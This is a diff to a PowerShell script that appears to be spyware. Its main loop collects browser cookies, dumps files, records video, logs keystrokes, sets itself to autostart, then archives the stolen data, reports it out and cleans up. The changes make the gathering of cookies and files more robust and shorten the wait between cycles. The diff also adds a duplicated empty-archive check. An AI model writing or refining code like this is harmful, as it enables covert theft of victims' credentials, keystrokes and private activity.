@@ -166,14 +166,25 @@ function Archive-And-Report {
             }
         }
         
-        $pathsToArchive = @(
-            "$cookieDir\*",
-            "$fileDumpDir\*",
-            "$videoSubDir\*",
-            $logPath, $meta, $keylogPath
-        )
+        $pathsToArchive = @()
+
+        if (Test-Path $cookieDir) {
+            $pathsToArchive += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+        if (Test-Path $fileDumpDir) {
+            $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+        if (Test-Path $videoSubDir) {
+            $pathsToArchive += Get-ChildItem $videoSubDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+
+        $pathsToArchive += $logPath, $meta, $keylogPath
         if ($pathsToArchive.Count -eq 0) {
             Write-Warning "Nothing to archive - skipping archive/report"
+            return
+        }
+        if ($pathsToArchive.Count -eq 0) {
+            Write-Warning "Nothing to archive — skipping"
             return
         }
 
@@ -231,13 +242,12 @@ while ($true) {
     Collect-Cookies
     Collect-Files
     Start-Recording
+    Start-Sleep -Seconds 90
     Ensure-Autostart
-    Start-Sleep -Seconds 300
     Archive-And-Report
-    if (Test-Path $zipPath) {
-        Cleanup
-    }
+    Cleanup
     Start-Sleep -Seconds 60
 }
+
 
 Stop-Transcript
